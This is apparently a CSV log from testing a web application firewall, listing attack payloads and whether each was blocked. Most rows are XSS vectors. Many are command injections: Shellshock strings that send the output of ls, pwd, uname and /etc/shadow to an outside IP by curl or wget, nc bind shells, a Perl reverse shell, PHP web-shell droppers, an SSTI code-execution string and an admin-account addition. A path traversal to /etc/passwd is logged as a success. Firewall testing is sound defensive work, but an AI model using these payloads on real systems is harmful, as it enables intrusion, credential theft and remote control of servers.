Status,Payload,HTTP Status,Content Length
Blocked,"<div id=""1""><form id=""test""></form><button form=""test"" formaction=""javascript:alert(1)"">X</button>//[""'`-->]]>]</div><div id=""2""><meta charset=""x-imap4-modified-utf7"">&ADz&AGn&AG0&AEf&ACA&AHM&AHI&AGO&AD0&AGn&ACA&AG8Abg&AGUAcgByAG8AcgA9AGEAbABlAHIAdAAoADEAKQ&ACAAPABi//[""'`-->]]>]</div><div id=""3""><meta charset=""x-imap4-modified-utf7"">&<script&S1&TS&1>alert&A7&(1)&R&UA;&&<&A9&11/script&X&>//[""'`-->]]>]</div><div id=""4"">0?<script>Worker(""#"").onmessage=function(_)eval(_.data)</script> :postMessage(importScripts('data:;base64,cG9zdE1lc3NhZ2UoJ2FsZXJ0KDEpJyk'))//[""'`-->]]>]</div><div id=""5""><script>crypto.generateCRMFRequest('CN=0',0,0,null,'alert(5)',384,null,'rsa-dual-use')</script>//[""'`-->]]>]</div><div id=""6""><script>({set/**/$($){_/**/setter=$,_=1}}).$=alert</script>//[""'`-->]]>]</div><div id=""7""><input onfocus=alert(7) autofocus>//[""'`-->]]>]</div><div id=""8""><input onblur=alert(8) autofocus><input autofocus>//[""'`-->]]>]</div><div id=""9""><a style=""-o-link:'javascript:alert(9)';-o-link-source:current"">X</a>//[""'`-->]]>]</div><div id=""10""><video poster=javascript:alert(10)//></video>//[""'`-->]]>]</div><div id=""11""><svg xmlns=""http://www.w3.org/2000/svg""><g onload=""javascript:alert(11)""></g></svg>//[""'`-->]]>]</div><div id=""12""><body onscroll=alert(12)><br><br><br><br><br><br>...<br><br><br><br><input autofocus>//[""'`-->]]>]</div><div id=""13""><x repeat=""template"" repeat-start=""999999"">0<y repeat=""template"" repeat-start=""999999"">1</y></x>//[""'`-->]]>]</div><div id=""14""><input pattern=^((a+.)a)+$ value=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!>//[""'`-->]]>]</div><div id=""15""><script>({0:#0=alert/#0#/#0#(0)})</script>//[""'`-->]]>]</div><div id=""16"">X<x style=`behavior:url(#default#time2)` onbegin=`alert(16)` >//[""'`-->]]>]</div><div id=""17""><?xml-stylesheet href=""javascript:alert(17)""?><root/>//[""'`-->]]>]</div><div id=""18""><script xmlns=""http://www.w3.org/1999/xhtml"">&#x61;l&#x65;rt&#40;1)</script>//[""'`-->]]>]</div><div id=""19""><meta charset=""x-mac-farsi"">¼script ¾alert(19)//¼/script ¾//[""'`-->]]>]</div><div id=""20""><script>ReferenceError.prototype.__defineGetter__('name', function(){alert(20)}),x</script>//[""'`-->]]>]</div><div id=""21""><script>Object.__noSuchMethod__ = Function,[{}][0].constructor._('alert(21)')()</script>//[""'`-->]]>]</div><div id=""22""><input onblur=focus() autofocus><input>//[""'`-->]]>]</div><div id=""23""><form id=test onforminput=alert(23)><input></form><button form=test onformchange=alert(2)>X</button>//[""'`-->]]>]</div><div id=""24"">1<set/xmlns=`urn:schemas-microsoft-com:time` style=`beh&#x41vior:url(#default#time2)` attributename=`innerhtml` to=`&lt;img/src=&quot;x&quot;onerror=alert(24)&gt;`>//[""'`-->]]>]</div><div id=""25""><script src=""#"">{alert(25)}</script>;1//[""'`-->]]>]</div><div id=""26"">+ADw-html+AD4APA-body+AD4APA-div+AD4-top secret+ADw-/div+AD4APA-/body+AD4APA-/html+AD4-.toXMLString().match(/.*/m),alert(RegExp.input);//[""'`-->]]>]</div><div id=""27""><style>p[foo=bar{}*{-o-link:'javascript:alert(27)'}{}*{-o-link-source:current}*{background:red}]{background:green};</style>//[""'`-->]]>]</div>",403,3662
Blocked,"<div id=""28"">1<animate/xmlns=urn:schemas-microsoft-com:time style=behavior:url(#default#time2)  attributename=innerhtml values=&lt;img/src=&quot;.&quot;onerror=alert(28)&gt;>//[""'`-->]]>]</div>",403,3662
Blocked,"<![><img src=""]><img src=x onerror=alert(39)//"">",403,3662
Blocked,"<svg><![CDATA[><image xlink:href=""]]><img src=xx:x onerror=alert(2)//""></svg>//[""'`-->]]>]</div>",403,3662
Blocked,"<div id=""40""><style><img src=""</style><img src=x onerror=alert(40)//"">//[""'`-->]]>]</div>",403,3662
Blocked,"<div id=""41""><li style=list-style:url() onerror=alert(41)></li>",403,3662
Blocked,"<div style=content:url(data:image/svg+xml,%3Csvg/%3E);visibility:hidden onload=alert(41)></div>//[""'`-->]]>]</div>",403,3662
Blocked,"<div id=""42""><head><base href=""javascript://""/></head><body><a href=""/. /,alert(42)//#"">XXX</a></body>//[""'`-->]]>]</div>",403,3662
Blocked,"<html xmlns=""http://www.w3.org/1999/xhtml"">",403,3662
Blocked,"<div id=""44""><style>*[{}@import'test.css?]{color: green;}</style>X//[""'`-->]]>]</div><div id=""45""><div style=""font-family:'foo[a];color:red;';"">XXX</div>//[""'`-->]]>]</div><div id=""46""><div style=""font-family:foo}color=red;"">XXX</div>//[""'`-->]]>]</div><div id=""47""><svg xmlns=""http://www.w3.org/2000/svg""><script>alert(47)</script></svg>//[""'`-->]]>]</div><div id=""48""><SCRIPT FOR=document EVENT=onreadystatechange>alert(48)</SCRIPT>//[""'`-->]]>]</div><div id=""49""><OBJECT CLASSID=""clsid:333C7BC4-460F-11D0-BC04-0080C7055A83""><PARAM NAME=""DataURL"" VALUE=""javascript:alert(49)""></OBJECT>//[""'`-->]]>]</div><div id=""50""><object data=""data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==""></object>//[""'`-->]]>]</div><div id=""51""><embed src=""data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==""></embed>//[""'`-->]]>]</div><div id=""52""><x style=""behavior:url(test.sct)"">//[""'`-->]]>]</div>",403,3662
Blocked,"<label dataformatas=""html"" datasrc=""#xss"" datafld=""payload""></label>//[""'`-->]]>]</div>",403,3662
Blocked,"<div id=""54""><script>[{'a':Object.prototype.__defineSetter__('b',function(){alert(arguments[0])}),'b':['secret']}]</script>//[""'`-->]]>]</div><div id=""55""><video><source onerror=""alert(55)"">//[""'`-->]]>]</div><div id=""56""><video onerror=""alert(56)""><source></source></video>//[""'`-->]]>]</div><div id=""57""><b <script>alert(57)//</script>0</script></b>//[""'`-->]]>]</div><div id=""58""><b><script<b></b><alert(58)</script </b></b>//[""'`-->]]>]</div><div id=""59""><div id=""div1""><input value=""``onmouseover=alert(59)""></div> <div id=""div2""></div><script>document.getElementById(""div2"").innerHTML = document.getElementById(""div1"").innerHTML;</script>//[""'`-->]]>]</div><div id=""60""><div style=""[a]color[b]:[c]red"">XXX</div>//[""'`-->]]>]</div>",403,3662
Blocked,"<x '=""foo""><x foo='><img src=x onerror=alert(62)//'>",403,3662
Blocked,"<! '=""foo""><x foo='><img src=x onerror=alert(2)//'>",403,3662
Blocked,"<? '=""foo""><x foo='><img src=x onerror=alert(3)//'>//[""'`-->]]>]</div>",403,3662
Blocked,"<div id=""63""><embed src=""javascript:alert(63)""></embed> // O10.10↓, OM10.0↓, GC6↓, FF",403,3662
Blocked,"<img src=""javascript:alert(2)"">",403,3662
Blocked,"<image src=""javascript:alert(2)""> // IE6, O10.10↓, OM10.0↓",403,3662
Blocked,"<script src=""javascript:alert(3)""></script> // IE6, O11.01↓, OM10.1↓//[""'`-->]]>]</div>",403,3662
Blocked,"<div id=""64""><!DOCTYPE x[<!ENTITY x SYSTEM ""http://html5sec.org/test.xxe"">]><y>&x;</y>//[""'`-->]]>]</div><div id=""65""><svg onload=""javascript:alert(65)"" xmlns=""http://www.w3.org/2000/svg""></svg>//[""'`-->]]>]</div>",403,3662
Blocked,"<?xml-stylesheet type=""text/xsl"" href=""data:,%3Cxsl:transform version='1.0' xmlns:xsl='http://www.w3.org/1999/XSL/Transform' id='xss'%3E%3Cxsl:output method='html'/%3E%3Cxsl:template match='/'%3E%3Cscript%3Ealert(66)%3C/script%3E%3C/xsl:template%3E%3C/xsl:transform%3E""?>",403,3662
Blocked,"    <html:style /><x xlink:href=""javascript:alert(68)"" xlink:type=""simple"">XXX</x>",403,3662
Blocked,"<div id=""69""><card xmlns=""http://www.wapforum.org/2001/wml""><onevent type=""ontimer""><go href=""javascript:alert(69)""/></onevent><timer value=""1""/></card>//[""'`-->]]>]</div><div id=""70""><div style=width:1px;filter:glow onfilterchange=alert(70)>x</div>//[""'`-->]]>]</div><div id=""71""><// style=x:expression\28alert(71)\29>//[""'`-->]]>]</div><div id=""72""><form><button formaction=""javascript:alert(72)"">X</button>//[""'`-->]]>]</div><div id=""73""><event-source src=""event.php"" onload=""alert(73)"">//[""'`-->]]>]</div><div id=""74""><a href=""javascript:alert(74)""><event-source src=""data:application/x-dom-event-stream,Event:click%0Adata:XXX%0A%0A"" /></a>//[""'`-->]]>]</div><div id=""75""><script<{alert(75)}/></script </>//[""'`-->]]>]</div><div id=""76""><?xml-stylesheet type=""text/css""?><!DOCTYPE x SYSTEM ""test.dtd""><x>&x;</x>//[""'`-->]]>]</div><div id=""77""><?xml-stylesheet type=""text/css""?><root style=""x:expression(alert(77))""/>//[""'`-->]]>]</div><div id=""78""><?xml-stylesheet type=""text/xsl"" href=""#""?><img xmlns=""x-schema:test.xdr""/>//[""'`-->]]>]</div><div id=""79""><object allowscriptaccess=""always"" data=""test.swf""></object>//[""'`-->]]>]</div><div id=""80""><style>*{x:ｅｘｐｒｅｓｓｉｏｎ(alert(80))}</style>//[""'`-->]]>]</div><div id=""81""><x xmlns:xlink=""http://www.w3.org/1999/xlink"" xlink:actuate=""onLoad"" xlink:href=""javascript:alert(81)"" xlink:type=""simple""/>//[""'`-->]]>]</div><div id=""82""><?xml-stylesheet type=""text/css"" href=""data:,*%7bx:expression(write(2));%7d""?>//[""'`-->]]>]</div>",403,3662
Blocked,"<a xmlns:xlink=""http://www.w3.org/1999/xlink"" xlink:href=""javascript:alert(87)""><rect width=""1000"" height=""1000"" fill=""white""/></a>",403,3662
Blocked,"<animation xlink:href=""javascript:alert(88)""/>",403,3662
Blocked,"<animation xlink:href=""data:text/xml,%3Csvg xmlns='http://www.w3.org/2000/svg' onload='alert(88)'%3E%3C/svg%3E""/>",403,3662
Blocked,"<image xlink:href=""data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' onload='alert(88)'%3E%3C/svg%3E""/>",403,3662
Blocked,"<foreignObject xlink:href=""javascript:alert(88)""/>",403,3662
Blocked,"<set attributeName=""onmouseover"" to=""alert(89)""/>",403,3662
Blocked,"<animate attributeName=""onunload"" to=""alert(89)""/>",403,3662
Blocked,<div style=content:url(test2.svg)></div>,403,3662
Blocked,"<div style=""background:url(test5.svg)"">PRESS ENTER</div>//[""'`-->]]>]</div>",403,3662
Blocked,"<? foo=""><script>alert(91)</script>"">",403,3662
Blocked,"<! foo=""><script>alert(91)</script>"">",403,3662
Blocked,"</ foo=""><script>alert(91)</script>"">",403,3662
Blocked,"<? foo=""><x foo='?><script>alert(91)</script>'>"">",403,3662
Blocked,"<% foo><x foo=""%><script>alert(91)</script>"">//[""'`-->]]>]</div>",403,3662
Blocked,"<div id=""92""><div style=""background:url(http://foo.f/f oo/;color:red/*/foo.jpg);"">X</div>//[""'`-->]]>]</div><div id=""93""><div style=""list-style:url(http://foo.f)\20url(javascript:alert(93));"">X</div>//[""'`-->]]>]</div>",403,3662
Blocked,"<handler xmlns:ev=""http://www.w3.org/2001/xml-events"" ev:event=""load"">alert(94)</handler>",403,3662
Blocked,"<set attributeName=""xlink:href"" to=""data:image/svg+xml;charset=utf-8;base64,",403,3662
Blocked,"<div id=""96""><iframe src=mhtml:http://html5sec.org/test.html!xss.html></iframe>",403,3662
Blocked,"<iframe src=mhtml:http://html5sec.org/test.gif!xss.html></iframe>//[""'`-->]]>]</div>",403,3662
Blocked,"<div id=d><x xmlns=""><iframe onload=alert(97)""></div>",403,3662
Blocked,<script>d.innerHTML+='';</script>,403,3662
Blocked,"<div id=d><x xmlns='""><iframe onload=alert(2)//'></div>",403,3662
Blocked,"<script>d.innerHTML+='';</script>//[""'`-->]]>]</div>",403,3662
Blocked,"<script>with(document.getElementById(""d""))innerHTML=innerHTML</script>//[""'`-->]]>]</div>",403,3662
Blocked,"<div id=""100""><img[a][b]src=x[d]onerror[c]=[e]""alert(100)"">//[""'`-->]]>]</div><div id=""101""><a href=""[a]java[b]script[c]:alert(101)"">XXX</a>//[""'`-->]]>]</div><div id=""102""><img src=""x` `<script>alert(102)</script>""` `>//[""'`-->]]>]</div><div id=""103""><script>history.pushState(0,0,'/i/am/somewhere_else');</script>//[""'`-->]]>]</div>",403,3662
Blocked,"<x xmlns=""http://www.w3.org/2001/xml-events"" event=""load"" observer=""foo"" handler=""data:image/svg+xml,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Chandler%20xml%3Aid%3D%22bar%22%20type%3D%22application%2Fecmascript%22%3E alert(104) %3C%2Fhandler%3E%0A%3C%2Fsvg%3E%0A#bar""/>",403,3662
Blocked,"<div id=""105""><iframe src=""data:image/svg-xml,%1F%8B%08%00%00%00%00%00%02%03%B3)N.%CA%2C(Q%A8%C8%CD%C9%2B%B6U%CA())%B0%D2%D7%2F%2F%2F%D7%2B7%D6%CB%2FJ%D77%B4%B4%B4%D4%AF%C8(%C9%CDQ%B2K%CCI-*%D10%D4%B4%D1%87%E8%B2%03""></iframe>//[""'`-->]]>]</div><div id=""106""><img src onerror /"" '""= alt=alert(106)//"">//[""'`-->]]>]</div><div id=""107""><title onpropertychange=alert(107)></title><title title=></title>//[""'`-->]]>]</div>",403,3662
Blocked,"<a href=http://foo.bar/#x=`y></a><img alt=""`><img src=xx:x onerror=alert(108)></a>"">",403,3662
Blocked,"<!a foo=x=`y><img alt=""`><img src=xx:x onerror=alert(2)//"">",403,3662
Blocked,"<?a foo=x=`y><img alt=""`><img src=xx:x onerror=alert(3)//"">//[""'`-->]]>]</div>",403,3662
Blocked,"<rect  fill=""white"" style=""clip-path:url(test3.svg#a);fill:url(#b);filter:url(#c);marker:url(#d);mask:url(#e);stroke:url(#f);""/>",403,3662
Blocked,"<path d=""M0,0"" style=""marker-start:url(test4.svg#a)""/>",403,3662
Blocked,"<div id=""111""><div style=""background:url(/f#[a]oo/;color:red/*/foo.jpg);"">X</div>//[""'`-->]]>]</div><div id=""112""><div style=""font-family:foo{bar;background:url(http://foo.f/oo};color:red/*/foo.jpg);"">X</div>//[""'`-->]]>]</div>",403,3662
Blocked,"<div id=""114""><x style=""background:url('x[a];color:red;/*')"">XXX</x>//[""'`-->]]>]</div>",403,3662
Blocked,"<div id=""115""><!--[if]><script>alert(115)</script -->",403,3662
Blocked,"<!--[if<img src=x onerror=alert(2)//]> -->//[""'`-->]]>]</div>",403,3662
Blocked,"<div id=""117""><a href=""http://attacker.org"">",403,3662
Blocked,"    <iframe src=""http://example.org/""></iframe>",403,3662
Blocked,"<div id=""118""><div draggable=""true"" ondragstart=""event.dataTransfer.setData('text/plain','malicious code');"">",403,3662
Blocked,"<iframe src=""http://www.example.org/dropHere.html""></iframe>//[""'`-->]]>]</div>",403,3662
Blocked,"<div id=""119""><iframe src=""view-source:http://www.example.org/"" frameborder=""0"" style=""width:400px;height:180px""></iframe>",403,3662
Blocked,"        window.open('popup.html','spam'+i,'width=50,height=50');",403,3662
Blocked,"<div id=""121""><html xmlns=""http://www.w3.org/1999/xhtml""",403,3662
Blocked,"<body style=""background:gray"">",403,3662
Blocked,"<iframe src=""http://example.com/"" style=""width:800px; height:350px; border:none; mask: url(#maskForClickjacking);""/>",403,3662
Blocked,"<div id=""122""><iframe sandbox=""allow-same-origin allow-forms allow-scripts"" src=""http://example.org/""></iframe>//[""'`-->]]>]</div>",403,3662
Blocked,"<a class=bar href=""http://www.example.org"">www.example.org</a>",403,3662
Blocked,"<script src=""http://code.jquery.com/jquery-1.4.4.js""></script>",403,3662
Blocked,"$(""span.foo"").click(function() {",403,3662
Blocked,alert('foo');,403,3662
Blocked,"$(""a.bar"").click(function() {",403,3662
Blocked,alert('bar');,403,3662
Blocked,"location=""http://html5sec.org"";",403,3662
Blocked,"<div id=""124""><script src=""/\example.com\foo.js""></script> // Safari 5.0, Chrome 9, 10",403,3662
Blocked,"<script src=""\\example.com\foo.js""></script> // Safari 5.0//[""'`-->]]>]</div>",403,3662
Blocked,"            <iframe xmlns=""http://www.w3.org/1999/xhtml"" src=""javascript:alert(125)""></iframe>",403,3662
Blocked,"<object classid=""clsid:02BF25D5-8C17-4B23-BC80-D3488ABDDC6B"" onqt_error=""alert(126)"" style=""behavior:url(#x);""><param name=postdomevents /></object>//[""'`-->]]>]</div>",403,3662
Blocked,"<handler id=""y"">alert(127)</handler>",403,3662
Blocked,"<div id=""128""><svg><style>&lt;img/src=x onerror=alert(128)// </b>//[""'`-->]]>]</div>",403,3662
Blocked,"%2 -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #' |ping -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #\"" |ping -n 21 127.0.0.1",403,3662
Blocked,%20{${sleep(20)}},403,3662
Blocked,%20{${sleep(3)}},403,3662
Blocked,|ls,403,3662
Blocked,||ls,403,3662
Blocked,|||ls,403,3662
Blocked,|echo hello there,403,3662
Blocked,|- -| ls,403,3662
Blocked,;ls,403,3662
Blocked,;;ls,403,3662
Blocked,;;;ls,403,3662
Blocked,;echo hello there,403,3662
Blocked,;- -; ls,403,3662
Blocked,"() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=16?user=\`ls\`""",403,3662
Blocked,"() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=18?pwd=\`pwd\`""",403,3662
Blocked,"() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=20?shadow=\`grep root /etc/shadow\`""",403,3662
Blocked,"() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=22?uname=\`uname -a\`""",403,3662
Blocked,"() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=24?shell=\`nc -lvvp 1234 -e /bin/bash\`""",403,3662
Blocked,"() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=26?shell=\`nc -lvvp 1236 -e /bin/bash &\`""",403,3662
Blocked,"() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=5""",403,3662
Blocked,"() { :;}; /bin/bash -c ""sleep 1 && curl http://135.23.158.130/.testing/shellshock.txt?sleep=1&?vuln=6""",403,3662
Blocked,"() { :;}; /bin/bash -c ""sleep 1 && echo vulnerable 1""",403,3662
Blocked,"() { :;}; /bin/bash -c ""sleep 3 && curl http://135.23.158.130/.testing/shellshock.txt?sleep=3&?vuln=7""",403,3662
Blocked,"() { :;}; /bin/bash -c ""sleep 3 && echo vulnerable 3""",403,3662
Blocked,"() { :;}; /bin/bash -c ""sleep 6 && curl http://135.23.158.130/.testing/shellshock.txt?sleep=6&?vuln=8""",403,3662
Blocked,"() { :;}; /bin/bash -c ""sleep 6 && curl http://135.23.158.130/.testing/shellshock.txt?sleep=9&?vuln=9""",403,3662
Blocked,"() { :;}; /bin/bash -c ""sleep 6 && echo vulnerable 6""",403,3662
Blocked,"() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=17?user=\`ls\`""",403,3662
Blocked,"() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=19?pwd=\`pwd\`""",403,3662
Blocked,"() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=21?shadow=\`grep root /etc/shadow\`""",403,3662
Blocked,"() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=23?uname=\`uname -a\`""",403,3662
Blocked,"() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=25?shell=\`nc -lvvp 1235 -e /bin/bash\`""",403,3662
Blocked,"() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=27?shell=\`nc -lvvp 1237 -e /bin/bash &\`""",403,3662
Blocked,"() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=4""",403,3662
Blocked,$(`cat /etc/passwd`),403,3662
Blocked,() { :;}; curl http://135.23.158.130/.testing/shellshock.txt?vuln=12,403,3662
Blocked,$(`dir`),403,3662
Blocked,| dir C:\,403,3662
Blocked,; dir C:\,403,3662
Blocked,| dir C:\Documents and Settings\*,403,3662
Blocked,; dir C:\Documents and Settings\*,403,3662
Blocked,| dir C:\Users,403,3662
Blocked,; dir C:\Users,403,3662
Blocked,;echo%20'<script>alert(1)</script>',403,3662
Blocked,echo '<img src=https://crowdshield.com/.testing/xss.js onload=prompt(2) onerror=alert(3)></img>'// XXXXXXXXXXX,403,3662
Blocked,"| echo ""<?php include($_GET['page'])| ?>"" > rfi.php",403,3662
Blocked,"; echo ""<?php include($_GET['page']); ?>"" > rfi.php",403,3662
Blocked,"| echo ""<?php system('dir $_GET['dir']')| ?>"" > dir.php ",403,3662
Blocked,"; echo ""<?php system('dir $_GET['dir']'); ?>"" > dir.php ",403,3662
Blocked,"& echo ""<?php system('dir $_GET['dir']'); ?>"" > dir.php ",403,3662
Blocked,"&& echo ""<?php system('dir $_GET['dir']'); ?>"" > dir.php ",403,3662
Blocked,"echo ""<?php system('dir $_GET['dir']'); ?>"" > dir.php",403,3662
Blocked,"| echo ""<?php system($_GET['cmd'])| ?>"" > cmd.php",403,3662
Blocked,"; echo ""<?php system($_GET['cmd']); ?>"" > cmd.php",403,3662
Blocked,"& echo ""<?php system($_GET['cmd']); ?>"" > cmd.php",403,3662
Blocked,"&& echo ""<?php system($_GET['cmd']); ?>"" > cmd.php",403,3662
Blocked,"echo ""<?php system($_GET['cmd']); ?>"" > cmd.php",403,3662
Blocked,;echo '<script>alert(1)</script>',403,3662
Blocked,echo '<script>alert(1)</script>'// XXXXXXXXXXX,403,3662
Blocked,echo '<script src=https://crowdshield.com/.testing/xss.js></script>'// XXXXXXXXXXX,403,3662
Blocked,"| echo ""use Socket;$i=""192.168.16.151"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">;S"");open(STDOUT,"">;S"");open(STDERR,"">;S"");exec(""/bin/sh -i"");};"" > rev.pl",403,3662
Blocked,"; echo ""use Socket;$i=""192.168.16.151"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">;S"");open(STDOUT,"">;S"");open(STDERR,"">;S"");exec(""/bin/sh -i"");};"" > rev.pl",403,3662
Blocked,() { :;}; echo vulnerable 10,403,3662
Blocked,eval('ls'),403,3662
Blocked,eval('pwd'),403,3662
Blocked,eval('pwd');,403,3662
Blocked,eval('sleep 5'),403,3662
Blocked,eval('sleep 5');,403,3662
Blocked,eval('ls'),403,3662
Blocked,eval('ls');,403,3662
Blocked,| ifconfig,403,3662
Blocked,; ifconfig,403,3662
Blocked,| ipconfig /all,403,3662
Blocked,; ipconfig /all,403,3662
Blocked,$(`ls`),403,3662
Blocked,| ls -l /,403,3662
Blocked,; ls -l /,403,3662
Blocked,| ls -laR /etc,403,3662
Blocked,; ls -laR /etc,403,3662
Blocked,| ls -laR /var/www,403,3662
Blocked,; ls -laR /var/www,403,3662
Blocked,| ls -l /etc/,403,3662
Blocked,; ls -l /etc/,403,3662
Blocked,| ls -l /home/*,403,3662
Blocked,; ls -l /home/*,403,3662
Blocked,*; ls -lhtR /var/www/,403,3662
Blocked,| ls -l /tmp,403,3662
Blocked,; ls -l /tmp,403,3662
Blocked,| ls -l /var/www/*,403,3662
Blocked,; ls -l /var/www/*,403,3662
Blocked,\n\033[2curl http://135.23.158.130/.testing/term_escape.txt?vuln=1?user=\`ls\`,403,3662
Blocked,\n\033[2wget http://135.23.158.130/.testing/term_escape.txt?vuln=2?user=\`ls\`,403,3662
Blocked,| net localgroup Administrators hacker /ADD,403,3662
Blocked,; net localgroup Administrators hacker /ADD,403,3662
Blocked,& net localgroup Administrators hacker /ADD,403,3662
Blocked,&& net localgroup Administrators hacker /ADD,403,3662
Blocked,net localgroup Administrators hacker /ADD,403,3662
Blocked,;netstat -a;,403,3662
Blocked,| netstat -an,403,3662
Blocked,; netstat -an,403,3662
Blocked,"perl -e 'print ""X""x1024'",403,3662
Blocked,"|| perl -e 'print ""X""x16096'",403,3662
Blocked,"| perl -e 'print ""X""x16096'",403,3662
Blocked,"; perl -e 'print ""X""x16096'",403,3662
Blocked,"& perl -e 'print ""X""x16096'",403,3662
Blocked,"&& perl -e 'print ""X""x16096'",403,3662
Blocked,"perl -e 'print ""X""x16384'",403,3662
Blocked,"; perl -e 'print ""X""x2048'",403,3662
Blocked,"& perl -e 'print ""X""x2048'",403,3662
Blocked,"&& perl -e 'print ""X""x2048'",403,3662
Blocked,"perl -e 'print ""X""x2048'",403,3662
Blocked,"|| perl -e 'print ""X""x4096'",403,3662
Blocked,"| perl -e 'print ""X""x4096'",403,3662
Blocked,"; perl -e 'print ""X""x4096'",403,3662
Blocked,"& perl -e 'print ""X""x4096'",403,3662
Blocked,"&& perl -e 'print ""X""x4096'",403,3662
Blocked,"perl -e 'print ""X""x4096'",403,3662
Blocked,"|| perl -e 'print ""X""x8096'",403,3662
Blocked,"| perl -e 'print ""X""x8096'",403,3662
Blocked,"; perl -e 'print ""X""x8096'",403,3662
Blocked,"&& perl -e 'print ""X""x8096'",403,3662
Blocked,"perl -e 'print ""X""x8192'",403,3662
Blocked,"perl -e 'print ""X""x81920'",403,3662
Blocked,`ping 127.0.0.1`,403,3662
Blocked,| pwd,403,3662
Blocked,; pwd,403,3662
Blocked,| sleep 1,403,3662
Blocked,|| sleep 10,403,3662
Blocked,| sleep 10,403,3662
Blocked,{${sleep(10)}},403,3662
Blocked,|| sleep 15,403,3662
Blocked,| sleep 15,403,3662
Blocked, {${sleep(20)}},403,3662
Blocked,{${sleep(20)}},403,3662
Blocked, {${sleep(3)}},403,3662
Blocked,{${sleep(3)}},403,3662
Blocked,| sleep 5,403,3662
Blocked, {${sleep(hexdec(dechex(20)))}} ,403,3662
Blocked,{${sleep(hexdec(dechex(20)))}} ,403,3662
Blocked,system('cat C:\boot.ini');,403,3662
Blocked,| systeminfo,403,3662
Blocked,; systeminfo,403,3662
Blocked,test*; ls -lhtR /var/www/,403,3662
Blocked,"test* || perl -e 'print ""X""x16096'",403,3662
Blocked,"test* | perl -e 'print ""X""x16096'",403,3662
Blocked,"test* & perl -e 'print ""X""x16096'",403,3662
Blocked,"test* && perl -e 'print ""X""x16096'",403,3662
Blocked,"test*; perl -e 'print ""X""x16096'",403,3662
Blocked,$(`type C:\boot.ini`),403,3662
Blocked,&&type C:\\boot.ini,403,3662
Blocked,"() { :;};/usr/bin/perl -e 'print \""Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\"";system(\""wget http://135.23.158.130/.testing/shellshock.txt?vuln=13;curl http://135.23.158.130/.testing/shellshock.txt?vuln=15;\"");'",403,3662
Blocked,() { :;}; wget http://135.23.158.130/.testing/shellshock.txt?vuln=11,403,3662
Blocked,| ls,403,3662
Blocked,; ls,403,3662
Blocked,' || ls,403,3662
Blocked,'; ls,403,3662
Blocked,""" || ls",403,3662
Blocked,""" | ls",403,3662
Blocked,"""; ls",403,3662
Blocked,$(`ls`),403,3662
Blocked,"{{ get_user_file(""C:\boot.ini"") }}",403,3662
Blocked,"{{[].__class__.__mro__[1].__subclasses__()[230]('id',stdout=-1).communicate()}}",403,3662
Success,../../../../../../../../../../etc/passwd,200,10701
